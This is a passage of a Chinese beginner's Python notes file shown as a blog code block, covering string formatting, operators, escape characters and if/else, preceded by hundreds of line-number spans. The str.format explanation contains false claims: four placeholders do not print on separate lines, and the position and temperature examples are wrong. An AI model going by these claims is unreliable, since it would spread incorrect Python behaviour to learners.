class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#  %格式化输出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name=&#x27;czxh&#x27;</span></span><br><span class="line"><span class="string">age=18</span></span><br><span class="line"><span class="string">print(&quot;我的姓名：%s 我的年龄：%06d&quot; % (name,age))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=4.3</span></span><br><span class="line"><span class="string">print(&quot;%.6f&quot;%s)#设置小数点位数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  f格式化输出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(f&quot;我的名字是&#123;name&#125;,年龄是&#123;age&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">format方法是Python中用于字符串格式化的内置方法，它允许你将指定的值插入到字符串的占位符中。‌</span></span><br><span class="line"><span class="string">基本用法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ‌插入变量‌：在字符串中使用“&#123;&#125;”包围变量名，然后在format函数中列出变量和对应的值。例如：&quot;The value is: &#123;&#125;&quot;.format(100) 输出为 &quot;The value is: 100&quot;。‌1</span></span><br><span class="line"><span class="string">    ‌指定位置‌：在格式字符串中的“&#123;&#125;”里可以使用数字指定变量的位置。例如：&quot;&#123;&#125; and &#123;&#125;&quot;.format(&quot;apple&quot;, &quot;banana&quot;) 输出为 &quot;apple and banana&quot;。‌1</span></span><br><span class="line"><span class="string">    ‌格式化数据类型‌：在“&#123;&#125;”内可以使用特定的格式代码来指定数据的显示方式。例如：&quot;&#123;:05d&#125;&quot;.format(123) 表示用至少五位数字显示整数，不足的前面用零填充；&quot;&#123;:.2f&#125;&quot;.format(3.14159) 表示显示浮点数并保留两位小数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">高级用法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ‌复杂应用‌：format方法支持更复杂的操作，如条件判断和循环，使得字符串的输出更加灵活多变。例如，可以在format中嵌入if语句，根据条件改变输出内容。</span></span><br><span class="line"><span class="string">    ‌指定长度格式化‌：多用于学校课后作业以及面试题，日常工作较少使用。例如：&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(&quot;Hello&quot;, &quot;Hello&quot;, &quot;Hello&quot;, &quot;Hello&quot;) 输出为四个&quot;Hello&quot;分行显示。‌2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">示例</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ‌格式化数字‌：num = 123; print(&quot;&#123;:05d&#125;&quot;.format(num)) 输出为 &quot;00123&quot;。</span></span><br><span class="line"><span class="string">    ‌控制浮点数精度‌：float_num = 3.14159; print(&quot;&#123;:.2f&#125;&quot;.format(float_num)) 输出为 &quot;3.14&quot;。</span></span><br><span class="line"><span class="string">    ‌使用条件判断‌：&quot;温度是&#123;:&#125;&#123;&#125;&quot;.format(temp_sign)，当温度为正时，temp_sign为空字符串，否则为“负”。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">通过合理使用format方法，可以根据需要精确地控制字符串的输出格式，使代码更加简洁和易于理解。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#算术运算符(使用算术运算符，只要其中有浮点数，结果就用浮点数表示)</span></span><br><span class="line"><span class="comment">#    // 取整除，向下取整，（只要有小数，则忽略）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(7//2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#   % 取余数（取模）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(5%2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#   **  幂    m**n  m的n次方</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(7**2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#赋值运算符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">num1=5</span></span><br><span class="line"><span class="string">num2=8</span></span><br><span class="line"><span class="string">num3=num1</span></span><br><span class="line"><span class="string">num4=num1+num2</span></span><br><span class="line"><span class="string">print(num1)</span></span><br><span class="line"><span class="string">print(num4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a=1</span></span><br><span class="line"><span class="string">a=a+1</span></span><br><span class="line"><span class="string">a+=1   #a+=1 等价于 a=a+1</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#转义字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\t  制表符</span></span><br><span class="line"><span class="string">\n  换行——将当前位置移动到下一行开头</span></span><br><span class="line"><span class="string">\r  回车——将当前位置移动到本行开头</span></span><br><span class="line"><span class="string">\\  输出 \</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r 原生字符串，默认不转义！</span></span><br><span class="line"><span class="string">print(r&quot;\r\n\t&quot;)   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#if 判断</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if 5:</span></span><br><span class="line"><span class="string">    print(&quot;haha1111&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#逻辑运算符  and   or   not</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a=&#x27;haha&#x27;</span></span><br><span class="line"><span class="string">b=&#x27;heihei&#x27;</span></span><br><span class="line"><span class="string">if a==&#x27;haha&#x27; and b==&#x27;heihei&#x27;:  #左右两边都符合为真</span></span><br><span class="line"><span class="string">    print(&#x27;666666666&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if a==&#x27;haha&#x27; or b==&#x27;666&#x27;:</span></span><br><span class="line"><span class="string">    print(&#x27;777777777&#x27;) #有一边为真则为真</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(3&lt;9)#返回True</span></span><br><span class="line"><span class="string">print(not 3&lt;9)#返回False    #  not 表示相反的结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#基本格式</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if 1:</span></span><br><span class="line"><span class="string">    print(&quot;11111&quot;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    print(&quot;222222&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#if_elif_else格式</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if 1==2:</span></span><br><span class="line"><span class="string">    print(&quot;1111111&quot;)</span></span><br><span class="line"><span class="string">elif 1==3:</span></span><br><span class="line"><span class="string">    print(&quot;222222&quot;)</span></span><br><span class="line"><span class="string">elif 1==1:</span></span><br><span class="line"><span class="string">    print(&quot;55555&quot;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">   print(&quot;00000&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 三目运算：</span></span><br><span class="line"><span class="comment"># 格式：       为真结果 if 条件 else 为假结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#循环</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i=1</span></span><br><span class="line"><span 